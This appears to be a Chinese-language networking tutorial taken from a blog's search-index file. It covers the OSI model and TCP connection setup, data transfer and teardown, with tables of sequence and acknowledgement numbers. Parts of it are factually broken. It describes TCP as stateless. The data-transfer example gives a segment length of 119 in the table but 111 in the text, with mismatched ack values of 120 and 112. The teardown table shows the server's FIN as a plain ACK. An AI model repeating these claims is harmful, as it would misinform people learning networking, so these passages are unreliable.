        <content type="html"><![CDATA[<blockquote><p>OSI是<code>Open System Interconnection</code>的缩写，国际标准化组织（ISO）制定了OSI模型，该模型定义了不同计算机互联的标准，是设计和描述计算机网络通信的基本框架。加粗为四层模型</p></blockquote><table><thead><tr><th align="center">参考模型（从上至下）</th><th align="center">各层含义</th></tr></thead><tbody><tr><td align="center"><strong>应用层</strong></td><td align="center">为应用程序提供服务，如HTTP、FTP、SMTP、POP3等</td></tr><tr><td align="center">表示层</td><td align="center">数据格式转换翻译、数据加密解密、压缩解压缩</td></tr><tr><td align="center">会话层</td><td align="center">不同机器之间的用户建立及管理会话</td></tr><tr><td align="center"><strong>传输层</strong></td><td align="center">建立管理和维护端到端的连接，TCP、UDP</td></tr><tr><td align="center"><strong>网络层</strong></td><td align="center">IP地址及路由选择</td></tr><tr><td align="center"><strong>数据链路层</strong></td><td align="center">物理寻址，将原始比特流转化为逻辑传输线路</td></tr><tr><td align="center">物理层</td><td align="center">机械、电子、定时接口通信信道上上的原始比特流传输</td></tr></tbody></table><h2 id="1-传输层"><a href="#1-传输层" class="headerlink" title="1. 传输层"></a>1. 传输层</h2><blockquote><p>接受上一次的数据，将数据进行分割，保证数据准确到达对端。</p></blockquote><h2 id="2-TCP"><a href="#2-TCP" class="headerlink" title="2. TCP"></a>2. TCP</h2><blockquote><p>TCP是面向连接的无状态的协议。为了连接的可靠性，每次连接的建立都需要3次握手。</p></blockquote><h3 id="2-1-建立连接（3次握手）"><a href="#2-1-建立连接（3次握手）" class="headerlink" title="2.1 建立连接（3次握手）"></a>2.1 建立连接（3次握手）</h3><blockquote><p>3次握手的目的：</p><ol><li>同步连接双方的序列号和确认号；</li><li>交换TCP窗口大小信息。</li></ol></blockquote><table><thead><tr><th align="center">客户端(状态）</th><th align="center">建立连接（三次握手）</th><th align="center">服务端（状态）</th></tr></thead><tbody><tr><td align="center"><code>CLOSED</code></td><td align="center"></td><td align="center"><code>LISTEN</code></td></tr><tr><td align="center"></td><td align="center"><code>SYN seq=0</code> ==》</td><td align="center"></td></tr><tr><td align="center"><code>SYN_SENT</code></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center">《== <code>SYN ACK ack=1,seq=0</code></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><code>SYN_RCVD</code></td></tr><tr><td align="center"></td><td align="center">ACK <code>ack=1,seq=1</code> ==》</td><td align="center"></td></tr><tr><td align="center"><code>ESTABLISHED</code></td><td align="center"></td><td align="center"><code>ESTABLISHED</code></td></tr></tbody></table><ul><li>第一次握手: 建立连接。客户端发送连接请求，发送SYN报文，随机生成seq，本例默认为0。然后，客户端进入<code>SYN_SEND</code>状态，等待服务器的确认。</li><li>第二次握手: 服务器收到客户端的SYN报文段。需要对这个SYN报文段进行确认，发送ACK报文，将ack设置为1（ack值为对方<code>seq+1</code>或者<code>seq+L</code>(数据长度L)）。同时，自己还要发送SYN请求信息，将seq为0。服务器端将上述所有信息一并发送给客户端，此时服务器进入<code>SYN_RECV</code>状态。</li><li>第三次握手: 客户端收到服务器的ACK和SYN报文后，进行确认，然后将ack设置为1，seq设置为1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入<code>ESTABLISHED</code>状态，完成TCP三次握手。</li></ul><h3 id="2-2-数据传输"><a href="#2-2-数据传输" class="headerlink" title="2.2 数据传输"></a>2.2 数据传输</h3><table><thead><tr><th align="center">客户端</th><th align="center">数据传输</th><th align="center">服务端</th></tr></thead><tbody><tr><td align="center"></td><td align="center"><code>PSH seq=1， ACK ack=1（segmentLen = 99）</code> ==》</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">《== <code>PSH seq=1, ACK ack=100 （segmentLen = 119）</code></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><code>ACK ack=120,seq=100</code> ==》</td><td align="center"></td></tr></tbody></table><ul><li>客户端先向服务器发送数据，该数据报是长度为99的数据。</li><li>服务器收到报文后, 也向客户端发送了一个数据进行确认（<code>ACK</code>），并且返回客户端要请求的数据，数据的长度为111，将seq设置为1，ack设置为120（1 + 119）。</li><li>客户端收到服务器返回的数据后进行确认（ACK），将seq设置为100， ack设置为112（1 + 111）。</li></ul><h3 id="2-3-断开链接（4次挥手）"><a href="#2-3-断开链接（4次挥手）" class="headerlink" title="2.3 断开链接（4次挥手）"></a>2.3 断开链接（4次挥手）</h3><table><thead><tr><th align="center">客户端(状态）</th><th align="center">断开连接</th><th align="center">服务端（状态）</th><th></th></tr></thead><tbody><tr><td align="center"></td><td align="center"><code>FIN ACK ack=120，seq=100</code> ==》</td><td align="center"></td><td></td></tr><tr><td align="center"><code>FIN_WAIT_1</code></td><td align="center"></td><td align="center"></td><td></td></tr><tr><td align="center"></td><td align="center">《== <code>ACK ack=101,seq=120</code></td><td align="center"></td><td></td></tr><tr><td align="center"><code>FIN_WAIT_2</code></td><td align="center"></td><td align="center"><code>CLOSE_WAIT</code></td><td></td></tr><tr><td align="center"></td><td align="center">《== <code>ACK ack=101,seq=120</code></td><td align="center"></td><td></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><code>LAST_ACK</code></td><td></td></tr><tr><td align="center"></td><td align="center"><code>ACK ack=121,seq=101</code> ==》</td><td align="center"></td><td></td></tr><tr><td align="center"><code>TIME_WAIT</code></td><td align="center"></td><td align="center"><code>CLOSE</code></td><td></td></tr></tbody></table><ul><li>第一次挥手：客户端向服务器发送一个FIN报文段，将设置seq为100和ack为120，;此时，客户端进入 FIN_WAIT_1状态,这表示客户端没有数据要发送服务器了，请求关闭连接;</li><li>第二次挥手：服务器收到了客户端发送的FIN报文段，向客户端回一个ACK报文段，ack设置为101，seq设置为120;服务器进入了CLOSE_WAIT状态，客户端收到服务器返回的ACK报文后，进入FIN_WAIT_2状态;</li><li>第三次挥手：服务器会观察自己是否还有数据没有发送给客户端，如果有，先把数据发送给客户端，再发送FIN报文；如果没有，那么服务器直接发送FIN报文给客户端。请求关闭连接，同时服务器进入LAST_ACK状态;</li><li>第四次挥手：客户端收到服务器发送的FIN报文段，向服务器发送ACK报文段，将seq设置为101，将ack设置为121，然后客户端进入TIME_WAIT状态;服务器收到客户端的ACK报文段以后，就关闭连接;此时，客户端等待2MSL后依然没有收到回复，则证明Server端已正常关闭，客户端也可以关闭连接了。</li></ul><blockquote><p><strong>计算规则：</strong><br>seq 为序列号<br>ack 为应答码<br>seq = 对方上次的ack；（首次发送时seq为系统随机生成）<br>ack = 对方的seq+1（无数据传输时） 或者 seq+L（报文数据的长度L</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
